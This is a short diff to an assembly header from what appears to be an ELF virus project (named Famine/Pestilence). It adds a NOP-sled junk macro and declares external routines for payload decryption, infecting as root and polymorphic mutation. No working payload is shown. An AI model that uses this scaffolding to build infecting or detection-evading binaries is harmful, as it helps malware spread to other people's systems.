@@ -4,7 +4,7 @@
 	%define PESTILENCE
 
 ; Syscall numbers
-	%define PAGE_SIZE 16384
+	%define PAGE_SIZE (4096 * 4)
 	%define SYS_READ 0
 	%define SYS_WRITE 1
 	%define SYS_OPEN 2
@@ -72,6 +72,17 @@
 	%define PF_R			4
 	%define PT_LOAD			1
 
+; Usefull macros
+
+	;; -----------------------------------------------------------------------------
+	;; JUNK macro for NOPsleds
+	;; -----------------------------------------------------------------------------
+	%macro	JUNK 1
+		%rep	%1
+			nop
+		%endrep
+	%endmacro
+
 ; includes
 	%ifndef FAMINE_S
 		extern _start
@@ -108,6 +119,11 @@
 		extern _thread_create
 		extern _fork_before_exec_normaly
 		extern _fork_before_infect_root
+	%endif
+
+	%ifndef DEPACKER_NOPED_S
+		extern _decrypt_noped
+		extern _end_decrypt_noped
 	%endif
 
 	%ifndef DEPACKER_S
@@ -177,5 +193,12 @@
 
 	%ifndef FAMINE_OPTIONS_S
 		extern _famine_start_options
+	%endif
+
+	%ifndef POLYMORPHISM_S
+		extern	_timestamp
+		extern	_prng
+		extern	_urand
+		extern	_byterpl
 	%endif
 %endif
